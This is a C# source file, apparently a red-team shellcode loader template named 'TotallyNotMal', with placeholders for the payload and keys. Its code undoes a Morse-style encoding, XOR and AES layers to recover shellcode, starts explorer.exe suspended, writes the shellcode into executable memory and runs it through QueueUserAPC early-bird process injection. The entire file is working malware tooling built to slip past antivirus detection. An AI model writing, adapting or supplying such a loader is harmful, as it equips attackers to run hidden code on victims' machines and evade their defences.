//compile with
// C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe

using System;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace TotallyNotMal
{
    public class Program
    {
        [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        public enum ProcessAccessRights
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200),
            THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
            THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
        }

        public enum MemAllocation
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x1000000,
            SecCommit = 0x08000000
        }

        public enum MemProtect
        {
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_TARGETS_INVALID = 0x40000000,
            PAGE_TARGETS_NO_UPDATE = 0x40000000,
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        //internal struct STARTUPINFO
        public struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            public uint dwFlags;
            public ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }

        public static PROCESS_INFORMATION StartProcess(string binaryPath)
        {
            uint flags = 0x00000004;

            STARTUPINFO startInfo = new STARTUPINFO();
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
            CreateProcess((IntPtr)0, binaryPath, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo);

            return procInfo;
        }

        private static byte[] xorEncDec(byte[] input, string theKeystring)
        {

            byte[] theKey = Encoding.UTF8.GetBytes(theKeystring);
            byte[] mixed = new byte[input.Length];

            for (int i = 0; i < input.Length; i++)
            {
                int length = i % theKey.Length;
                mixed[i] = (byte)(input[i] ^ theKey[length]);
            }
            return mixed;
        }

            //https://raw.githubusercontent.com/smokeme/payloadGenerator/main/xor/template
            public static string DecryptStringFromBytes(byte[] cipherText, byte[] rawKey, byte[] rawIV)
        {

            // Declare the string used to hold
            // the decrypted text.
            string plaintext = null;

            // Create an RijndaelManaged object
            // with the specified key and IV.
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = rawKey;
                rijAlg.IV = rawIV;

                // Create a decrytor to perform the stream transform.
                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);

                // Create the streams used for decryption.
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {

                            // Read the decrypted bytes from the decrypting stream
                            // and place them in a string.
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }

            }

            return plaintext;

        }

            //https://www.codeproject.com/Articles/5719/Simple-encrypting-and-decrypting-data-in-C
            public static byte[] AESDecrypt(byte[] cipherData, string aes_key, string aes_iv)
        {

            MemoryStream ms = new MemoryStream();

            Rijndael alg = Rijndael.Create();

            alg.Key = Convert.FromBase64String(aes_key);
            alg.IV = Convert.FromBase64String(aes_iv);

            CryptoStream cs = new CryptoStream(ms,
                alg.CreateDecryptor(), CryptoStreamMode.Write);

            cs.Write(cipherData, 0, cipherData.Length);

            cs.Close();

            byte[] decryptedData = ms.ToArray();

            return decryptedData;
        }

        public static string rahsia(string encoded)
        {
            char[] text = { 'a', 'A', 'b', 'B', 'c', 'C', 'd', 'D', 'e', 'E', 'f', 'F', 'g', 'G', 'h', 'H', 'i', 'I', 'j', 'J', 'k', 'K', 'l', 'L', 'm', 'M', 'n', 'N', 'o', 'O', 'p', 'P', 'q', 'Q', 'r', 'R', 's', 'S', 't', 'T', 'u', 'U', 'v', 'V', 'w', 'W', 'x', 'X', 'y', 'Y', 'z', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '/', '=', '+', '!' };
            string[] titik = { ".-", "^.-", "-...", "^-...", "-.-.", "^-.-.", "-..", "^-..", ".", "^.", "..-.", "^..-.", "--.", "^--.", "....", "^....", "..", "^..", ".---", "^.---", "-.-", "^-.-", ".-..", "^.-..", "--", "^--", "-.", "^-.", "---", "^---", ".--.", "^.--.", "--.-", "^--.-", ".-.", "^.-.", "...", "^...", "-", "^-", "..-", "^..-", "...-", "^...-", ".--", "^.--", "-..-", "^-..-", "-.--", "^-.--", "--..", "^--..", "-----", ".----", "..---", "...--", "....-", ".....", "-....", "--...", "---..", "----.", "/", "...^-", "^.^", "^..^" };
            string[] codes = encoded.Split(' ');

            StringBuilder decoded = new StringBuilder();

            for (int i = 0; i < codes.Length; i++)
            {

                for (int k = 0; k < titik.Length; k++)
                {
                    if (codes[i].Equals(titik[k]))
                    {
                        decoded.Append(text[k]);
                    }
                }

            }
            return decoded.ToString();
        }

        public static void Main()
        {

            string xoredAesB64 = rahsia("REPLACE SHELLCODE HERE");
            string xorKey = rahsia("REPLACE XORKEY");
            string aE5k3y = rahsia("REPLACE A3S_KEY");
            string aE5Iv = rahsia("REPLACE A3S_IV");

            byte[] sh3Llc0d3 = new byte[] { };

            byte[] aesEncrypted = xorEncDec(Convert.FromBase64String(xoredAesB64), xorKey);

            //Console.WriteLine("After XOR DEc: " + Encoding.UTF8.GetString(aesEncrypted));

            sh3Llc0d3 = AESDecrypt(aesEncrypted, aE5k3y, aE5Iv);

            //Console.WriteLine("After AES DEc: " + Encoding.UTF8.GetString(sh3Llc0d3));

            //sh3Llc0d3 = Convert.FromBase64String(DecryptStringFromBytes(aesEncrypted, key, iv));

            //var decrypted = DecryptStringFromBytes(xorEncDec(Convert.FromBase64String(xorAesEncStringB64), xorKey),key,iv);

            // Console.WriteLine($"XOR decrypted text: {shellcode}");

            //shellcode = Convert.FromBase64String(b64);

            uint lpNumberOfBytesWritten = 0;

            PROCESS_INFORMATION processInfo = StartProcess("C:/Windows/explorer.exe");
            //use this if you prefer not to spawn new process
            //PROCESS_INFORMATION processInfo = Process.GetProcessesByName("explorer")[0];

            IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)processInfo.dwProcessId);

            IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)sh3Llc0d3.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);

            if(WriteProcessMemory(pHandle, rMemAddress, sh3Llc0d3, (uint)sh3Llc0d3.Length, ref lpNumberOfBytesWritten))
            {

                IntPtr tHandle = OpenThread(ThreadAccess.THREAD_ALL, false, (uint)processInfo.dwThreadId);

                IntPtr ptr = QueueUserAPC(rMemAddress, tHandle, IntPtr.Zero);

                ResumeThread(tHandle);

            }
            bool hOpenProcessClose = CloseHandle(pHandle);

        }
    }


}